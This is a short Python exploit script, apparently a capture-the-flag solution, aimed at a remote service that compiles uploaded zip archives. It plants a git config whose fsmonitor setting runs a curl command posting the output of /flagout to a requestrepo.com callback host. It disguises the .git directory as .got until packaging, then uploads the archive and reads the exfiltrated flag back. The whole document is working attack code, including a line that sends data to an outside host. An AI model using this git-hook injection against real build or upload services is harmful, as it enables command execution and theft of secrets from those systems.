import requests
from time import sleep
from pathlib import Path
from requestrepo import Requestrepo
repo = Requestrepo()

#MULLE_HOST = '127.0.0.1:5555'
MULLE_HOST = '100.64.16.2:5555'

GIT_CONFIG = f'''
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
	fsmonitor = "curl -X POST -d "flag=$(/flagout)" http://{repo.subdomain}.requestrepo.com/ #"
'''.strip()

Path('./exploit.zip').unlink(missing_ok=True)

open('.got/config', 'w').write(GIT_CONFIG)

import zipfile

with zipfile.ZipFile('./exploit.zip', 'w') as zf:
    for p in Path('.').rglob('*'):
        if 'exploit.zip' not in p.parts:
            arcname = str(p).replace('.got', '.git')
            zf.write(p, arcname=arcname)

print('starting..')
resp = requests.post(f'http://{MULLE_HOST}/compile', files={'file': open('./exploit.zip', 'rb')})

print('polling..')
print(repo.get_http_request().raw.decode('utf-8').split('=')[1])


Path('./exploit.zip').unlink(missing_ok=True)